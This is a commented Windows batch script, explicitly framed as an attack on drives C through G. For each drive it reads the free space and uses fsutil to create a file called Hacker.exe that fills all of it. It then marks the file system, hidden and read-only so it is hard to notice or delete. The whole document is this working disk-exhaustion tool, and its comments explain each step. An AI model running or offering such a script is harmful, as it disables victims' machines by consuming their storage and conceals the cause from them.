@echo off
:: Suppresses command echoing to keep the console clean.
setlocal EnableDelayedExpansion
:: Enables delayed expansion (!var!) so variables inside loops and conditionals reflect updated values.
:: This is crucial for dynamic logic in this script — otherwise variable updates inside loops won't work.

:: Define the list of drive letters to check and attack.
set "drives=C D E F G"

:: Temp file path used when querying free space per drive.
set "freeSpaceFile=%temp%\freeSpace.tmp"

:: Prefix for temp files for each drive's WMIC output (keeps things isolated per drive).
set "tempFilePrefix=%temp%\drive"

:: -------------------------------
:: FUNCTION: getFreeSpace [drive]
:: Purpose: Queries and stores free space of a given drive using WMIC.
:: -------------------------------
:getFreeSpace
    set "drive=%~1"
    :: Argument passed to function, e.g., "C" becomes %~1

    set "tempFile=%tempFilePrefix%!drive!.tmp"
    :: Example: %temp%\driveC.tmp – isolates per-drive queries to avoid overwrite

    :: Use WMIC to get the free space in bytes for the given drive
    wmic logicaldisk where "caption='%drive%:'" get freespace /value > "!tempFile!"
    :: WMIC output looks like: FreeSpace=123456789

    :: Extract only the number from the file
    for /f "tokens=2 delims==" %%A in ('findstr /i "FreeSpace" "!tempFile!"') do (
        set "free=!free!%%A"
    )
    :: Why use `findstr` and temp files? WMIC has messy formatting — this ensures we grab clean values.

    del "!tempFile!"
    goto :eof

:: -------------------------------
:: FUNCTION: createAndHideFile [drive] [freeSpace]
:: Purpose: Creates a file that eats up free space and hides it.
:: -------------------------------
:createAndHideFile
    set "drive=%~1"
    set "free=%~2"

    set "filePath=!drive!:\Hacker.exe"
    :: Create the file in root of the drive (e.g., D:\Hacker.exe)

    if "!free!" gtr "0" (
        :: Create a file using `fsutil` with size equal to the free space (basically fills the drive)
        fsutil file createnew "!filePath!" !free!
        :: Why use `fsutil`? It's the fastest way to generate a large dummy file.

        :: Hide the file: +s = system, +h = hidden, +r = read-only (harder to notice/delete)
        attrib +s +h +r "!filePath!"

        echo Created and hid file on !drive! with size !free! bytes.
    ) else (
        echo The drive !drive! is full or not available!
    )
    goto :eof

:: -------------------------------
:: MAIN EXECUTION
:: Loop through all defined drives, get free space, and fill it with a hidden file
:: -------------------------------
set "randomSuffix=!random!!random!"
:: Generates a random suffix (was probably for file uniqueness — but not used)

for %%D in (%drives%) do (
    call :getFreeSpace %%D
    :: Fetch free space on this drive and store it in `!free!`

    set "freeSpace%%D=!free!"
    :: Store per-drive free space in uniquely named variables like freeSpaceC, freeSpaceD...

    call :createAndHideFile %%D !free!
    :: Fill up the drive with a hidden file of exactly that free space
)

:: -------------------------------
:: SUMMARY: Calculate total space taken and show per-drive stats
:: -------------------------------
set "totalFree=0"

for %%D in (%drives%) do (
    set /a "totalFree+=!freeSpace%%D!"
    echo Free space on %%D: !freeSpace%%D! bytes
)
:: Why? Helps see what was used on each drive and total — useful for reporting/logging.

:: -------------------------------
:: OBFUSCATED PRINTING: Slowly reveals message letter-by-letter
:: -------------------------------
set "msg=Script execution completed."
set "chars="

for /l %%i in (0,1,31) do (
    :: For each character index (0–31) in the message
    for /f "tokens=1,2 delims==" %%a in ('cmd /c "echo(%%msg:~%%i,1%%%"') do (
        :: Extract one character and append to the `chars` string
        set "chars=!chars!%%a"
    )
)

echo !chars!
:: Why this way? No real reason except obfuscation or style — could just be `echo %msg%`.

pause
:: Wait for user to press a key before exiting (useful for debugging)

exit
:: End the script
